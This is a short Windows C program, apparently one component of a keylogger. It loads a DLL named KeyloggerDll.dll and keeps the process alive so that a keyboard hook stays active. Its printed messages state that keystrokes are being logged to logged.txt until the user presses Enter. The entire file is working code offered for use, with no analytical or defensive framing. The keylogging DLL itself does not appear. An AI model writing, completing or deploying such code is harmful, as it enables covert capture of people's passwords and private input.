/* Simple loader - loads the DLL and keeps the process alive so the hook stays active.
   Usage: LoadDll.exe KeyloggerDll.dll
   Press Enter to unload and exit. */

#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    const char *dllPath = (argc > 1) ? argv[1] : "KeyloggerDll.dll";

    printf("[*] Loading %s ...\n", dllPath);
    HMODULE hDll = LoadLibraryA(dllPath);
    if (!hDll) {
        printf("[!] Failed to load DLL (error %lu)\n", GetLastError());
        return 1;
    }

    printf("[*] DLL loaded - keystrokes are being logged to logged.txt\n");
    printf("[*] Press Enter to stop and unload...\n");
    getchar();

    FreeLibrary(hDll);
    printf("[*] DLL unloaded. Done.\n");
    return 0;
}